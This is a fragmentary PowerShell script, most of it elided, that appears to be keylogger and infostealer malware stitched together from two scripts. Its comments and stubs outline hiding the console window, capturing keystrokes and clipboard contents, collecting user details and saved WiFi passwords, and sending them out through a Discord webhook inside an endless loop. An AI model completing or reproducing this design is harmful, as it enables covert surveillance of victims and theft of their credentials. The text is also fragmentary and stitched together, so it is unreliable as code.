...
# Import necessary Windows API functions to control window visibility and capture keyboard input
$Async = @"
...
# Function to get user information (from new script)
...
# Function to get WiFi passwords (from new script)
...
# Function to send system, user, and WiFi information via Discord webhook (from new script)
function Send-DiscordWebhook {
    ...
    **PC Information**
    `PC OS:` $($systemInfo['OS'])
    `OS Architecture:` $($systemInfo['Architecture'])
...
While ($true) {
    ...
    try {
        ...
        if ($keyPressed -or $clipboardContent) {
            ...
            # Send additional data with Send-DiscordWebhook
            Send-DiscordWebhook
